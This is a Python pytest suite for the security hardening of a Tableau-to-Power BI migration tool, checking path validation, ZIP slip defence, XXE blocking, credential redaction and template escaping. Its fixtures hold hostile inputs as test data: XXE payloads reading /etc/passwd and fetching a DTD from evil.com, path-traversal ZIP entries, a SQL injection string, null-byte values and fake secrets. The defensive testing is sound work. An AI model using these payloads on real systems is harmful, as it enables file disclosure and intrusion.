"""
Tests for Sprint 97 — Security Hardening.

Tests cover:
1. Path validation and traversal protection
2. ZIP slip defense
3. XML parsing security (XXE prevention)
4. Credential detection and redaction
5. Template substitution sanitization
6. Multi-tenant config validation
7. Wizard input validation
8. Migration artifact scanning
"""

import json
import os
import sys
import tempfile
import zipfile

import pytest

# ── Setup import paths ──────────────────────────────────────────────

ROOT_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.join(ROOT_DIR, 'powerbi_import'))
sys.path.insert(0, os.path.join(ROOT_DIR, 'tableau_export'))

from security_validator import (
    validate_path,
    validate_output_dir,
    safe_zip_extract_member,
    validate_zip_archive,
    safe_parse_xml,
    redact_credentials,
    redact_m_credentials,
    scan_for_credentials,
    sanitize_template_value,
    validate_migration_artifacts,
    SecurityError,
    MAX_FILE_SIZE_MB,
    MAX_ZIP_ENTRY_SIZE_MB,
    MAX_XML_SIZE_MB,
)


# ═══════════════════════════════════════════════════════════════════
#  1. Path validation tests
# ═══════════════════════════════════════════════════════════════════

class TestPathValidation:
    """Tests for validate_path() and validate_output_dir()."""

    def test_valid_path_exists(self, tmp_path):
        f = tmp_path / "test.twbx"
        f.write_text("dummy")
        valid, err = validate_path(str(f), must_exist=True)
        assert valid is True
        assert err is None

    def test_valid_path_no_exist_check(self):
        valid, err = validate_path("/nonexistent/file.twbx", must_exist=False)
        assert valid is True

    def test_empty_path(self):
        valid, err = validate_path("", must_exist=False)
        assert valid is False
        assert "empty" in err.lower()

    def test_null_byte_in_path(self):
        valid, err = validate_path("test\x00.twbx", must_exist=False)
        assert valid is False
        assert "null" in err.lower()

    def test_allowed_extensions(self, tmp_path):
        f = tmp_path / "test.exe"
        f.write_text("dummy")
        valid, err = validate_path(
            str(f), must_exist=True,
            allowed_extensions={'.twb', '.twbx'},
        )
        assert valid is False
        assert ".exe" in err

    def test_allowed_extension_accepted(self, tmp_path):
        f = tmp_path / "test.twbx"
        f.write_text("dummy")
        valid, err = validate_path(
            str(f), must_exist=True,
            allowed_extensions={'.twb', '.twbx'},
        )
        assert valid is True

    def test_path_does_not_exist(self):
        valid, err = validate_path("/nonexistent/abc.twbx", must_exist=True)
        assert valid is False
        assert "does not exist" in err

    def test_output_dir_empty(self):
        valid, err = validate_output_dir("")
        assert valid is False

    def test_output_dir_null_byte(self):
        valid, err = validate_output_dir("/tmp\x00/evil")
        assert valid is False
        assert "null" in err.lower()

    def test_output_dir_system_directory(self):
        # Windows system dir
        valid, err = validate_output_dir("C:\\Windows\\System32")
        assert valid is False
        assert "system" in err.lower()

    def test_output_dir_valid(self, tmp_path):
        valid, err = validate_output_dir(str(tmp_path / "output"))
        assert valid is True


# ═══════════════════════════════════════════════════════════════════
#  2. ZIP slip defense tests
# ═══════════════════════════════════════════════════════════════════

class TestZipSlipDefense:
    """Tests for safe_zip_extract_member() and validate_zip_archive()."""

    def _create_zip(self, tmp_path, entries):
        """Create a ZIP file with specified entries."""
        zip_path = str(tmp_path / "test.zip")
        with zipfile.ZipFile(zip_path, 'w') as zf:
            for name, content in entries.items():
                zf.writestr(name, content)
        return zip_path

    def test_safe_extraction_normal(self, tmp_path):
        zip_path = self._create_zip(tmp_path, {"data/file.twb": "<workbook/>"})
        with zipfile.ZipFile(zip_path, 'r') as zf:
            content = safe_zip_extract_member(zf, "data/file.twb")
        assert content == b"<workbook/>"

    def test_path_traversal_blocked(self, tmp_path):
        zip_path = self._create_zip(tmp_path, {"../../../etc/passwd": "evil"})
        with zipfile.ZipFile(zip_path, 'r') as zf:
            with pytest.raises(SecurityError, match="path traversal"):
                safe_zip_extract_member(zf, "../../../etc/passwd")

    def test_absolute_path_blocked(self, tmp_path):
        zip_path = self._create_zip(tmp_path, {"/etc/passwd": "evil"})
        with zipfile.ZipFile(zip_path, 'r') as zf:
            with pytest.raises(SecurityError, match="absolute path"):
                safe_zip_extract_member(zf, "/etc/passwd")

    def test_backslash_traversal_blocked(self, tmp_path):
        """Backslash-based path traversal in entry name must be blocked."""
        zip_path = self._create_zip(tmp_path, {"../../evil.txt": "evil"})
        with zipfile.ZipFile(zip_path, 'r') as zf:
            # The member is stored with forward slashes after normalization
            names = zf.namelist()
            for name in names:
                with pytest.raises(SecurityError, match="path traversal"):
                    safe_zip_extract_member(zf, name)

    def test_target_dir_escape_blocked(self, tmp_path):
        """Verify extraction to target_dir blocks directory escape."""
        target = str(tmp_path / "safe")
        os.makedirs(target, exist_ok=True)
        zip_path = self._create_zip(tmp_path, {"sub/../../../escape.txt": "evil"})
        with zipfile.ZipFile(zip_path, 'r') as zf:
            with pytest.raises(SecurityError):
                safe_zip_extract_member(zf, "sub/../../../escape.txt", target_dir=target)

    def test_validate_safe_archive(self, tmp_path):
        zip_path = self._create_zip(tmp_path, {
            "workbook.twb": "<workbook/>",
            "Data/extract.hyper": "data",
        })
        is_safe, issues = validate_zip_archive(zip_path)
        assert is_safe is True
        assert issues == []

    def test_validate_unsafe_archive(self, tmp_path):
        zip_path = self._create_zip(tmp_path, {
            "../../../etc/password": "evil",
        })
        is_safe, issues = validate_zip_archive(zip_path)
        assert is_safe is False
        assert any("traversal" in i.lower() for i in issues)


# ═══════════════════════════════════════════════════════════════════
#  3. XML parsing security tests
# ═══════════════════════════════════════════════════════════════════

class TestXMLSecurity:
    """Tests for safe_parse_xml() — XXE prevention."""

    def test_normal_xml(self):
        root = safe_parse_xml("<workbook><dashboard name='test'/></workbook>")
        assert root.tag == "workbook"
        assert root.find("dashboard").get("name") == "test"

    def test_xxe_entity_blocked(self):
        """DOCTYPE with ENTITY declarations must be rejected."""
        xxe_xml = """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>"""
        with pytest.raises(SecurityError, match="XXE"):
            safe_parse_xml(xxe_xml)

    def test_xxe_parameter_entity_blocked(self):
        xxe_xml = """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">
  %xxe;
]>
<data>test</data>"""
        with pytest.raises(SecurityError, match="XXE"):
            safe_parse_xml(xxe_xml)

    def test_normal_doctype_warning(self):
        """DOCTYPE without entities should parse but warn."""
        xml = """<?xml version="1.0"?>
<!DOCTYPE workbook>
<workbook><sheet name="test"/></workbook>"""
        # Should not raise — just warns
        root = safe_parse_xml(xml)
        assert root.tag == "workbook"

    def test_bytes_input(self):
        root = safe_parse_xml(b"<root><item/></root>")
        assert root.tag == "root"

    def test_malformed_xml_raises(self):
        import xml.etree.ElementTree as ET
        with pytest.raises(ET.ParseError):
            safe_parse_xml("<unclosed>")


# ═══════════════════════════════════════════════════════════════════
#  4. Credential detection and redaction tests
# ═══════════════════════════════════════════════════════════════════

class TestCredentialRedaction:
    """Tests for redact_credentials(), redact_m_credentials(), scan_for_credentials()."""

    def test_password_redacted(self):
        text = "Server=myserver;Password=SuperSecret123;Database=mydb"
        result = redact_credentials(text)
        assert "SuperSecret123" not in result
        assert "***REDACTED***" in result
        assert "Server=myserver" in result

    def test_bearer_token_redacted(self):
        text = "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.payload.sig"
        result = redact_credentials(text)
        assert "eyJhbGciOiJIUzI1NiJ9" not in result
        assert "***REDACTED***" in result

    def test_basic_auth_redacted(self):
        text = "Auth: Basic dXNlcjpwYXNz"
        result = redact_credentials(text)
        assert "dXNlcjpwYXNz" not in result
        assert "***REDACTED***" in result

    def test_access_key_redacted(self):
        text = "account_key=abc123def456ghi789"
        result = redact_credentials(text)
        assert "abc123def456ghi789" not in result
        assert "***REDACTED***" in result

    def test_client_secret_redacted(self):
        text = "client_secret=my-super-secret-value"
        result = redact_credentials(text)
        assert "my-super-secret-value" not in result
        assert "***REDACTED***" in result

    def test_api_key_redacted(self):
        text = "api_key=sk_live_abc123"
        result = redact_credentials(text)
        assert "sk_live_abc123" not in result
        assert "***REDACTED***" in result

    def test_no_credentials_unchanged(self):
        text = "Server=myserver;Database=mydb;Trusted_Connection=True"
        result = redact_credentials(text)
        assert result == text

    def test_empty_text(self):
        assert redact_credentials("") == ""
        assert redact_credentials(None) is None

    def test_m_password_redacted(self):
        m = 'Source = Sql.Database("server", "db", [Password="secret123"])'
        result = redact_m_credentials(m)
        assert "secret123" not in result
        assert "***REDACTED***" in result

    def test_m_uid_redacted(self):
        m = 'Source = Sql.Database("server", "db", [User ID="admin"])'
        result = redact_m_credentials(m)
        assert "admin" not in result

    def test_scan_detects_password(self):
        findings = scan_for_credentials("password=mypass123")
        assert len(findings) >= 1
        assert findings[0]['type'] == 'password'

    def test_scan_detects_bearer(self):
        findings = scan_for_credentials("Bearer eyJ0eXAiOi...")
        assert any(f['type'] == 'bearer_token' for f in findings)

    def test_scan_no_findings(self):
        findings = scan_for_credentials("just normal text here")
        assert findings == []

    def test_scan_empty(self):
        assert scan_for_credentials("") == []
        assert scan_for_credentials(None) == []

    def test_multiple_credentials(self):
        text = "password=abc; secret=def; api_key=ghi"
        result = redact_credentials(text)
        assert "abc" not in result
        assert "def" not in result
        assert "ghi" not in result
        assert result.count("***REDACTED***") >= 3


# ═══════════════════════════════════════════════════════════════════
#  5. Template substitution sanitization tests
# ═══════════════════════════════════════════════════════════════════

class TestTemplateSanitization:
    """Tests for sanitize_template_value()."""

    def test_json_escaping(self):
        result = sanitize_template_value('value"with\\quotes', context='json')
        assert result == 'value\\"with\\\\quotes'

    def test_m_escaping(self):
        result = sanitize_template_value('value"with"quotes', context='m')
        assert result == 'value""with""quotes'

    def test_tmdl_escaping(self):
        result = sanitize_template_value("value'with'quotes", context='tmdl')
        assert result == "value''with''quotes"

    def test_null_byte_blocked(self):
        with pytest.raises(ValueError, match="null bytes"):
            sanitize_template_value("evil\x00value")

    def test_non_string_converted(self):
        result = sanitize_template_value(42, context='json')
        assert result == "42"

    def test_empty_string(self):
        result = sanitize_template_value("", context='json')
        assert result == ""


# ═══════════════════════════════════════════════════════════════════
#  6. Multi-tenant config validation tests
# ═══════════════════════════════════════════════════════════════════

class TestMultiTenantSecurity:
    """Tests for multi-tenant config loading and override sanitization."""

    def test_load_valid_config(self, tmp_path):
        sys.path.insert(0, os.path.join(ROOT_DIR, 'powerbi_import', 'deploy'))
        from multi_tenant import MultiTenantConfig

        config_data = {
            "tenants": [{
                "name": "Contoso",
                "workspace_id": "aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee",
                "connection_overrides": {"${TENANT_SERVER}": "contoso-sql.database.windows.net"},
            }]
        }
        config_file = tmp_path / "tenants.json"
        config_file.write_text(json.dumps(config_data))

        config = MultiTenantConfig.load(str(config_file))
        assert len(config.tenants) == 1
        assert config.tenants[0].name == "Contoso"

    def test_load_invalid_structure(self, tmp_path):
        sys.path.insert(0, os.path.join(ROOT_DIR, 'powerbi_import', 'deploy'))
        from multi_tenant import MultiTenantConfig

        config_file = tmp_path / "bad.json"
        config_file.write_text('"not an object"')

        with pytest.raises(ValueError, match="JSON object"):
            MultiTenantConfig.load(str(config_file))

    def test_load_missing_tenants_key(self, tmp_path):
        sys.path.insert(0, os.path.join(ROOT_DIR, 'powerbi_import', 'deploy'))
        from multi_tenant import MultiTenantConfig

        config_file = tmp_path / "bad.json"
        config_file.write_text('{"data": []}')

        with pytest.raises(ValueError, match="tenants"):
            MultiTenantConfig.load(str(config_file))

    def test_load_nonexistent_file(self):
        sys.path.insert(0, os.path.join(ROOT_DIR, 'powerbi_import', 'deploy'))
        from multi_tenant import MultiTenantConfig

        with pytest.raises(FileNotFoundError):
            MultiTenantConfig.load("/nonexistent/config.json")

    def test_override_null_byte_blocked(self, tmp_path):
        """Null bytes in override values must be rejected."""
        sys.path.insert(0, os.path.join(ROOT_DIR, 'powerbi_import', 'deploy'))
        from multi_tenant import _apply_connection_overrides

        model_dir = str(tmp_path / "model")
        os.makedirs(model_dir)
        tmdl_file = os.path.join(model_dir, "model.tmdl")
        with open(tmdl_file, 'w') as f:
            f.write("server = '${TENANT_SERVER}'")

        output_dir = str(tmp_path / "output")

        with pytest.raises(ValueError, match="null bytes"):
            _apply_connection_overrides(
                model_dir,
                {"${TENANT_SERVER}": "evil\x00server"},
                output_dir,
            )

    def test_override_invalid_placeholder_skipped(self, tmp_path):
        """Non-${UPPER_NAME} placeholders are silently skipped."""
        sys.path.insert(0, os.path.join(ROOT_DIR, 'powerbi_import', 'deploy'))
        from multi_tenant import _apply_connection_overrides

        model_dir = str(tmp_path / "model")
        os.makedirs(model_dir)
        tmdl_file = os.path.join(model_dir, "model.tmdl")
        with open(tmdl_file, 'w') as f:
            f.write("DROP TABLE students; --")

        output_dir = str(tmp_path / "output")
        # Invalid placeholder name should be skipped
        _apply_connection_overrides(
            model_dir,
            {"DROP TABLE": "injected"},
            output_dir,
        )
        # File should be unchanged (invalid placeholder was skipped)
        with open(os.path.join(output_dir, "model.tmdl")) as f:
            content = f.read()
        assert content == "DROP TABLE students; --"

    def test_override_json_escaping(self, tmp_path):
        """Values in .json files get proper JSON escaping."""
        sys.path.insert(0, os.path.join(ROOT_DIR, 'powerbi_import', 'deploy'))
        from multi_tenant import _apply_connection_overrides

        model_dir = str(tmp_path / "model")
        os.makedirs(model_dir)
        json_file = os.path.join(model_dir, "config.json")
        with open(json_file, 'w') as f:
            f.write('{"server": "${TENANT_SERVER}"}')

        output_dir = str(tmp_path / "output")
        _apply_connection_overrides(
            model_dir,
            {"${TENANT_SERVER}": 'contoso"sql'},
            output_dir,
        )
        with open(os.path.join(output_dir, "config.json")) as f:
            content = f.read()
        # The quote must be escaped
        assert 'contoso\\"sql' in content


# ═══════════════════════════════════════════════════════════════════
#  7. Wizard input validation tests  
# ═══════════════════════════════════════════════════════════════════

class TestWizardValidation:
    """Tests for wizard _validate_file_path()."""

    def test_valid_twbx_path(self, tmp_path):
        from wizard import _validate_file_path
        f = tmp_path / "test.twbx"
        f.write_text("dummy")
        valid, err = _validate_file_path(str(f), allowed_extensions={'.twb', '.twbx'})
        assert valid is True

    def test_invalid_extension(self, tmp_path):
        from wizard import _validate_file_path
        f = tmp_path / "test.exe"
        f.write_text("dummy")
        valid, err = _validate_file_path(str(f), allowed_extensions={'.twb', '.twbx'})
        assert valid is False
        assert ".exe" in err

    def test_null_byte_blocked(self):
        from wizard import _validate_file_path
        valid, err = _validate_file_path("test\x00.twbx")
        assert valid is False
        assert "null" in err.lower()

    def test_empty_path(self):
        from wizard import _validate_file_path
        valid, err = _validate_file_path("")
        assert valid is False


# ═══════════════════════════════════════════════════════════════════
#  8. Migration artifact scanning tests
# ═══════════════════════════════════════════════════════════════════

class TestArtifactScanning:
    """Tests for validate_migration_artifacts()."""

    def test_clean_project(self, tmp_path):
        """Clean project with no embedded credentials."""
        proj = tmp_path / "MyProject.SemanticModel"
        proj.mkdir()
        (proj / "model.tmdl").write_text("table Sales\n  column Amount : int64\n")
        (proj / "config.json").write_text('{"version": "1.0"}')

        results = validate_migration_artifacts(str(proj))
        assert results['clean'] is True
        assert results['scanned_files'] == 2
        assert results['issues'] == []

    def test_project_with_embedded_password(self, tmp_path):
        """Project with password in .tmdl must be flagged."""
        proj = tmp_path / "MyProject.SemanticModel"
        proj.mkdir()
        (proj / "model.tmdl").write_text(
            'partition p1 = m\n  expression = Sql.Database("srv", "db", [Password="secret"])\n'
        )

        results = validate_migration_artifacts(str(proj))
        assert results['clean'] is False
        assert len(results['issues']) >= 1
        assert any(i['type'] == 'password' for i in results['issues'])

    def test_project_with_bearer_token(self, tmp_path):
        """Project with bearer token in .json must be flagged."""
        proj = tmp_path / "MyProject.Report"
        proj.mkdir()
        (proj / "connection.json").write_text(
            '{"auth": "Bearer eyJhbGciOiJSUzI1NiJ9.payload.sig"}'
        )

        results = validate_migration_artifacts(str(proj))
        assert results['clean'] is False
        assert any(i['type'] == 'bearer_token' for i in results['issues'])

    def test_missing_project_dir(self):
        results = validate_migration_artifacts("/nonexistent/project")
        assert results['clean'] is False
        assert any(i['type'] == 'missing' for i in results['issues'])


# ═══════════════════════════════════════════════════════════════════
#  9. Extract ZIP slip integration test
# ═══════════════════════════════════════════════════════════════════

class TestExtractZipSlipIntegration:
    """Integration test: extraction rejects malicious .twbx archives."""

    def test_twbx_with_traversal_skipped(self, tmp_path):
        """A .twbx with a path traversal entry should skip it gracefully."""
        twbx_path = str(tmp_path / "malicious.twbx")
        with zipfile.ZipFile(twbx_path, 'w') as zf:
            # Malicious entry
            zf.writestr("../../../evil.txt", "evil content")
            # Valid entry
            zf.writestr("workbook.twb", "<workbook version='1.0'/>")

        from extract_tableau_data import TableauExtractor
        extractor = TableauExtractor(twbx_path, output_dir=str(tmp_path / "output"))
        content = extractor.read_tableau_file()
        # Should read the valid .twb, skipping the malicious entry
        assert content is not None
        assert "workbook" in content

    def test_twbx_only_traversal_returns_none(self, tmp_path):
        """A .twbx with ONLY path traversal entries should return None."""
        twbx_path = str(tmp_path / "all_bad.twbx")
        with zipfile.ZipFile(twbx_path, 'w') as zf:
            zf.writestr("../../../evil.twb", "<workbook/>")

        from extract_tableau_data import TableauExtractor
        extractor = TableauExtractor(twbx_path, output_dir=str(tmp_path / "output"))
        content = extractor.read_tableau_file()
        assert content is None


# ═══════════════════════════════════════════════════════════════════
#  10. XXE integration test
# ═══════════════════════════════════════════════════════════════════

class TestXXEIntegration:
    """Integration test: safe_parse_xml blocks XXE in Tableau XML."""

    def test_xxe_in_twb_blocked(self):
        """Simulate a malicious TWB with XXE payload."""
        evil_twb = """<?xml version="1.0"?>
<!DOCTYPE workbook [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<workbook version="1.0">
  <datasources>
    <datasource name="&xxe;"/>
  </datasources>
</workbook>"""
        with pytest.raises(SecurityError, match="XXE"):
            safe_parse_xml(evil_twb)

    def test_normal_twb_parses(self):
        """Normal TWB XML should parse fine."""
        xml = """<?xml version="1.0"?>
<workbook version="1.0">
  <datasources>
    <datasource name="Sample"/>
  </datasources>
</workbook>"""
        root = safe_parse_xml(xml)
        assert root.tag == "workbook"
        ds = root.find(".//datasource")
        assert ds.get("name") == "Sample"
